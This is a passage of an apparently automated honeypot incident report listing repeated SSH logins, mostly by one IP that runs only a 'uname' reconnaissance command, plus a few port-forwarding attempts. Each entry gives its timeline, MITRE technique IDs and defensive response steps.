**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:01:01` | `cowrie.session.connect` |
| `2026-08-13 07:01:02` | `cowrie.client.version` |
| `2026-08-13 07:01:02` | `cowrie.client.kex` |
| `2026-08-13 07:01:04` | `cowrie.login.success` |
| `2026-08-13 07:01:05` | `cowrie.session.params` |
| `2026-08-13 07:01:05` | `cowrie.command.input` |
| `2026-08-13 07:01:05` | `cowrie.log.closed` |
| `2026-08-13 07:01:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-12ae32804c03

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:01 |
| **Last Seen** | 2026-08-13 07:01 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:01:08` | `cowrie.session.connect` |
| `2026-08-13 07:01:08` | `cowrie.client.version` |
| `2026-08-13 07:01:08` | `cowrie.client.kex` |
| `2026-08-13 07:01:09` | `cowrie.login.success` |
| `2026-08-13 07:01:09` | `cowrie.session.params` |
| `2026-08-13 07:01:09` | `cowrie.command.input` |
| `2026-08-13 07:01:10` | `cowrie.log.closed` |
| `2026-08-13 07:01:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a4ed4763930e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:01 |
| **Last Seen** | 2026-08-13 07:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:01:14` | `cowrie.session.connect` |
| `2026-08-13 07:01:14` | `cowrie.client.version` |
| `2026-08-13 07:01:14` | `cowrie.client.kex` |
| `2026-08-13 07:01:16` | `cowrie.login.success` |
| `2026-08-13 07:01:17` | `cowrie.session.params` |
| `2026-08-13 07:01:17` | `cowrie.command.input` |
| `2026-08-13 07:01:17` | `cowrie.log.closed` |
| `2026-08-13 07:01:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-599333cb23fe

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:01 |
| **Last Seen** | 2026-08-13 07:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:01:20` | `cowrie.session.connect` |
| `2026-08-13 07:01:21` | `cowrie.client.version` |
| `2026-08-13 07:01:21` | `cowrie.client.kex` |
| `2026-08-13 07:01:22` | `cowrie.login.success` |
| `2026-08-13 07:01:24` | `cowrie.session.params` |
| `2026-08-13 07:01:24` | `cowrie.command.input` |
| `2026-08-13 07:01:24` | `cowrie.log.closed` |
| `2026-08-13 07:01:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8044f595b158

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:01 |
| **Last Seen** | 2026-08-13 07:01 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:01:27` | `cowrie.session.connect` |
| `2026-08-13 07:01:27` | `cowrie.client.version` |
| `2026-08-13 07:01:27` | `cowrie.client.kex` |
| `2026-08-13 07:01:29` | `cowrie.login.success` |
| `2026-08-13 07:01:31` | `cowrie.session.params` |
| `2026-08-13 07:01:31` | `cowrie.command.input` |
| `2026-08-13 07:01:32` | `cowrie.log.closed` |
| `2026-08-13 07:01:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-542fc4cdb8e4

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:01 |
| **Last Seen** | 2026-08-13 07:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:01:34` | `cowrie.session.connect` |
| `2026-08-13 07:01:34` | `cowrie.client.version` |
| `2026-08-13 07:01:34` | `cowrie.client.kex` |
| `2026-08-13 07:01:36` | `cowrie.login.success` |
| `2026-08-13 07:01:37` | `cowrie.session.params` |
| `2026-08-13 07:01:37` | `cowrie.command.input` |
| `2026-08-13 07:01:37` | `cowrie.log.closed` |
| `2026-08-13 07:01:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b4cb4528bba9

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:01 |
| **Last Seen** | 2026-08-13 07:01 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:01:42` | `cowrie.session.connect` |
| `2026-08-13 07:01:42` | `cowrie.client.version` |
| `2026-08-13 07:01:42` | `cowrie.client.kex` |
| `2026-08-13 07:01:42` | `cowrie.login.success` |
| `2026-08-13 07:01:43` | `cowrie.session.params` |
| `2026-08-13 07:01:43` | `cowrie.command.input` |
| `2026-08-13 07:01:43` | `cowrie.log.closed` |
| `2026-08-13 07:01:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dcf6dd41320b

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:01 |
| **Last Seen** | 2026-08-13 07:01 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:01:48` | `cowrie.session.connect` |
| `2026-08-13 07:01:48` | `cowrie.client.version` |
| `2026-08-13 07:01:48` | `cowrie.client.kex` |
| `2026-08-13 07:01:49` | `cowrie.login.success` |
| `2026-08-13 07:01:50` | `cowrie.session.params` |
| `2026-08-13 07:01:50` | `cowrie.command.input` |
| `2026-08-13 07:01:51` | `cowrie.log.closed` |
| `2026-08-13 07:01:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f5ece10c934f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:01 |
| **Last Seen** | 2026-08-13 07:01 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:01:54` | `cowrie.session.connect` |
| `2026-08-13 07:01:55` | `cowrie.client.version` |
| `2026-08-13 07:01:55` | `cowrie.client.kex` |
| `2026-08-13 07:01:56` | `cowrie.login.success` |
| `2026-08-13 07:01:58` | `cowrie.session.params` |
| `2026-08-13 07:01:58` | `cowrie.command.input` |
| `2026-08-13 07:01:59` | `cowrie.log.closed` |
| `2026-08-13 07:01:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a5f4726aad2e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:02 |
| **Last Seen** | 2026-08-13 07:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:02:01` | `cowrie.session.connect` |
| `2026-08-13 07:02:01` | `cowrie.client.version` |
| `2026-08-13 07:02:01` | `cowrie.client.kex` |
| `2026-08-13 07:02:03` | `cowrie.login.success` |
| `2026-08-13 07:02:04` | `cowrie.session.params` |
| `2026-08-13 07:02:04` | `cowrie.command.input` |
| `2026-08-13 07:02:05` | `cowrie.log.closed` |
| `2026-08-13 07:02:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d5891e20479f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:02 |
| **Last Seen** | 2026-08-13 07:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:02:08` | `cowrie.session.connect` |
| `2026-08-13 07:02:08` | `cowrie.client.version` |
| `2026-08-13 07:02:08` | `cowrie.client.kex` |
| `2026-08-13 07:02:09` | `cowrie.login.success` |
| `2026-08-13 07:02:10` | `cowrie.session.params` |
| `2026-08-13 07:02:10` | `cowrie.command.input` |
| `2026-08-13 07:02:10` | `cowrie.log.closed` |
| `2026-08-13 07:02:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48f3529dda03

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:02 |
| **Last Seen** | 2026-08-13 07:02 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:02:14` | `cowrie.session.connect` |
| `2026-08-13 07:02:15` | `cowrie.client.version` |
| `2026-08-13 07:02:15` | `cowrie.client.kex` |
| `2026-08-13 07:02:16` | `cowrie.login.success` |
| `2026-08-13 07:02:18` | `cowrie.session.params` |
| `2026-08-13 07:02:18` | `cowrie.command.input` |
| `2026-08-13 07:02:18` | `cowrie.log.closed` |
| `2026-08-13 07:02:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b11d2e317a60

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:02 |
| **Last Seen** | 2026-08-13 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:02:22` | `cowrie.session.connect` |
| `2026-08-13 07:02:22` | `cowrie.client.version` |
| `2026-08-13 07:02:22` | `cowrie.client.kex` |
| `2026-08-13 07:02:23` | `cowrie.login.success` |
| `2026-08-13 07:02:24` | `cowrie.session.params` |
| `2026-08-13 07:02:24` | `cowrie.command.input` |
| `2026-08-13 07:02:24` | `cowrie.log.closed` |
| `2026-08-13 07:02:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bd2236d9b1f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:02 |
| **Last Seen** | 2026-08-13 07:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:02:29` | `cowrie.session.connect` |
| `2026-08-13 07:02:29` | `cowrie.client.version` |
| `2026-08-13 07:02:29` | `cowrie.client.kex` |
| `2026-08-13 07:02:30` | `cowrie.login.success` |
| `2026-08-13 07:02:31` | `cowrie.session.params` |
| `2026-08-13 07:02:31` | `cowrie.command.input` |
| `2026-08-13 07:02:31` | `cowrie.log.closed` |
| `2026-08-13 07:02:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f43bc79e39ff

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:02 |
| **Last Seen** | 2026-08-13 07:02 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:02:36` | `cowrie.session.connect` |
| `2026-08-13 07:02:36` | `cowrie.client.version` |
| `2026-08-13 07:02:36` | `cowrie.client.kex` |
| `2026-08-13 07:02:36` | `cowrie.login.success` |
| `2026-08-13 07:02:37` | `cowrie.session.params` |
| `2026-08-13 07:02:37` | `cowrie.command.input` |
| `2026-08-13 07:02:37` | `cowrie.log.closed` |
| `2026-08-13 07:02:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1eb1ba2bf7f1

| Field | Detail |
|---|---|
| **Source IP** | `175.198.18[.]3` |
| **First Seen** | 2026-08-13 07:02 |
| **Last Seen** | 2026-08-13 07:02 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:02:41` | `cowrie.session.connect` |
| `2026-08-13 07:02:42` | `cowrie.client.version` |
| `2026-08-13 07:02:42` | `cowrie.client.kex` |
| `2026-08-13 07:02:44` | `cowrie.login.success` |
| `2026-08-13 07:02:45` | `cowrie.direct-tcpip.request` |
| `2026-08-13 07:02:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `175.198.18[.]3` to AbuseIPDB if not already reported
- [ ] Block `175.198.18[.]3` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0895664fac0f

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:02 |
| **Last Seen** | 2026-08-13 07:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:02:43` | `cowrie.session.connect` |
| `2026-08-13 07:02:43` | `cowrie.client.version` |
| `2026-08-13 07:02:43` | `cowrie.client.kex` |
| `2026-08-13 07:02:44` | `cowrie.login.success` |
| `2026-08-13 07:02:44` | `cowrie.session.params` |
| `2026-08-13 07:02:44` | `cowrie.command.input` |
| `2026-08-13 07:02:45` | `cowrie.log.closed` |
| `2026-08-13 07:02:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7231b6af33c0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:02 |
| **Last Seen** | 2026-08-13 07:02 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:02:50` | `cowrie.session.connect` |
| `2026-08-13 07:02:50` | `cowrie.client.version` |
| `2026-08-13 07:02:50` | `cowrie.client.kex` |
| `2026-08-13 07:02:51` | `cowrie.login.success` |
| `2026-08-13 07:02:52` | `cowrie.session.params` |
| `2026-08-13 07:02:52` | `cowrie.command.input` |
| `2026-08-13 07:02:53` | `cowrie.log.closed` |
| `2026-08-13 07:02:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-223b289694c4

| Field | Detail |
|---|---|
| **Source IP** | `34.41.211[.]48` |
| **First Seen** | 2026-08-13 07:02 |
| **Last Seen** | 2026-08-13 07:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:02:54` | `cowrie.session.connect` |
| `2026-08-13 07:02:54` | `cowrie.client.version` |
| `2026-08-13 07:02:54` | `cowrie.client.kex` |
| `2026-08-13 07:02:55` | `cowrie.login.success` |
| `2026-08-13 07:02:56` | `cowrie.direct-tcpip.request` |
| `2026-08-13 07:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `34.41.211[.]48` to AbuseIPDB if not already reported
- [ ] Block `34.41.211[.]48` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ce0286ecfd2c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:02 |
| **Last Seen** | 2026-08-13 07:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:02:57` | `cowrie.session.connect` |
| `2026-08-13 07:02:57` | `cowrie.client.version` |
| `2026-08-13 07:02:57` | `cowrie.client.kex` |
| `2026-08-13 07:02:58` | `cowrie.login.success` |
| `2026-08-13 07:03:00` | `cowrie.session.params` |
| `2026-08-13 07:03:00` | `cowrie.command.input` |
| `2026-08-13 07:03:00` | `cowrie.log.closed` |
| `2026-08-13 07:03:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-47b6a071e4b1

| Field | Detail |
|---|---|
| **Source IP** | `200.105.141[.]172` |
| **First Seen** | 2026-08-13 07:03 |
| **Last Seen** | 2026-08-13 07:03 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:03:01` | `cowrie.session.connect` |
| `2026-08-13 07:03:01` | `cowrie.client.version` |
| `2026-08-13 07:03:01` | `cowrie.client.kex` |
| `2026-08-13 07:03:03` | `cowrie.login.success` |
| `2026-08-13 07:03:03` | `cowrie.direct-tcpip.request` |
| `2026-08-13 07:03:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.105.141[.]172` to AbuseIPDB if not already reported
- [ ] Block `200.105.141[.]172` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3f814f76a440

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:03 |
| **Last Seen** | 2026-08-13 07:03 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:03:03` | `cowrie.session.connect` |
| `2026-08-13 07:03:03` | `cowrie.client.version` |
| `2026-08-13 07:03:03` | `cowrie.client.kex` |
| `2026-08-13 07:03:04` | `cowrie.login.success` |
| `2026-08-13 07:03:05` | `cowrie.session.params` |
| `2026-08-13 07:03:05` | `cowrie.command.input` |
| `2026-08-13 07:03:05` | `cowrie.log.closed` |
| `2026-08-13 07:03:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f1b53fff757

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:03 |
| **Last Seen** | 2026-08-13 07:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:03:09` | `cowrie.session.connect` |
| `2026-08-13 07:03:10` | `cowrie.client.version` |
| `2026-08-13 07:03:10` | `cowrie.client.kex` |
| `2026-08-13 07:03:11` | `cowrie.login.success` |
| `2026-08-13 07:03:12` | `cowrie.session.params` |
| `2026-08-13 07:03:12` | `cowrie.command.input` |
| `2026-08-13 07:03:13` | `cowrie.log.closed` |
| `2026-08-13 07:03:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-188920d76b37

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:03 |
| **Last Seen** | 2026-08-13 07:03 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:03:16` | `cowrie.session.connect` |
| `2026-08-13 07:03:16` | `cowrie.client.version` |
| `2026-08-13 07:03:16` | `cowrie.client.kex` |
| `2026-08-13 07:03:18` | `cowrie.login.success` |
| `2026-08-13 07:03:19` | `cowrie.session.params` |
| `2026-08-13 07:03:19` | `cowrie.command.input` |
| `2026-08-13 07:03:20` | `cowrie.log.closed` |
| `2026-08-13 07:03:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e4763f9088f8

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:03 |
| **Last Seen** | 2026-08-13 07:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:03:22` | `cowrie.session.connect` |
| `2026-08-13 07:03:22` | `cowrie.client.version` |
| `2026-08-13 07:03:22` | `cowrie.client.kex` |
| `2026-08-13 07:03:25` | `cowrie.login.success` |
| `2026-08-13 07:03:27` | `cowrie.session.params` |
| `2026-08-13 07:03:27` | `cowrie.command.input` |
| `2026-08-13 07:03:28` | `cowrie.log.closed` |
| `2026-08-13 07:03:28` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29c36e37b311

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]227` |
| **First Seen** | 2026-08-13 07:03 |
| **Last Seen** | 2026-08-13 07:03 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-13 07:03:28` | `cowrie.session.connect` |
| `2026-08-13 07:03:29` | `cowrie.client.version` |
| `2026-08-13 07:03:29` | `cowrie.client.kex` |
| `2026-08-13 07:03:31` | `cowrie.login.success` |
| `2026-08-13 07:03:34` | `cowrie.session.params` |
| `2026-08-13 07:03:34` | `cowrie.command.input` |
| `2026-08-13 07:03:34` | `cowrie.log.closed` |
| `2026-08-13 07:03:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]227` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]227` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

